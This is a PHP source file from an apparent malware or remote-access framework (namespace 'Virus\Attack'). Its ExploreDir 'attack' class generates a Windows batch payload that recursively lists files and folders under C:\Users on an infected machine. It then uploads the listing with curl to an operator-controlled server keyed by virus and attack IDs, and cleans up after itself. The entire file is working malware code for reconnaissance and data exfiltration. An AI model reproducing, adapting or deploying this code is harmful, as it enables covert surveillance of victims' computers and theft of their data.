<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class ExploreDir. Explores a particular directory. Max number of files and directories is 10k. The user can set maximum depth to explore wide but not deep  and vice versa.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class ExploreDir extends AttackBase {
    public static int $maxLines = 10000;
    public static int $defaultDepth = 200;

    private string $rootDir;
    private int $maxDepth;

    public function __construct() {
        parent::__construct();
        $this->rootDir = "C:\\Users";
        $this->maxDepth = self::$defaultDepth;
    }

    public function getRootDir(): string {
        return $this->rootDir;
    }

    public function setRootDir(string $rootDir): void {
        $this->rootDir = $rootDir;
    }

    public function getMaxDepth(): int {
        return $this->maxDepth;
    }

    public function setMaxDepth(int $maxDepth): void {
        $this->maxDepth = $maxDepth;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        @echo off
        chCp 65001
        SetLocal EnableDelayedExpansion
        set tmpFile="%~pd0tmp"
        set echoFile="%~pd0echo"
        set /a linesLimit=<?php echo self::$maxLines . "\n"; ?>
        set /a depthLimit=<?php echo $this->maxDepth . "\n"; ?>
        set /a linesSoFar=0
        set /a count=0
        echo.> !echoFile!

        if not exist "<?php echo $this->rootDir; ?>" (goto ending)
        cd /d "<?php echo $this->rootDir; ?>"
        call :explore_dir
        goto ending

        :explore_dir
        for %%f in ("%cd%\*") do (
            echo !count!;f;%%~zf;%%~tf;%%~nxf>>"!echoFile!"
            set /a linesSoFar+=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
        )
        for /d %%d in ("%cd%\*") do (
            echo !count!;d;-;%%~td;%%~nxd>>"!echoFile!"
            set /a linesSoFar+=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
            if /i !count! geq !depthLimit! (goto explore_dir_exit)
            set /a count+=1
            cd "%%~d" 2> "!tmpFile!"
            if "!errorLevel!" == "0" (
                call :explore_dir
            )
            cd ..
            set /a count-=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
        )

        :explore_dir_exit
        exit /b 0

        :ending
        echo %cd%
        cd %~pd0
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "dirsFile=@%~pd0echo" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->rootDir = $state["rootDir"];
        $this->maxDepth = $state["maxDepth"];
    }

    protected function getState(): string {
        $state = [];
        $state["rootDir"] = $this->rootDir;
        $state["maxDepth"] = $this->maxDepth;
        return json_encode($state);
    }
}
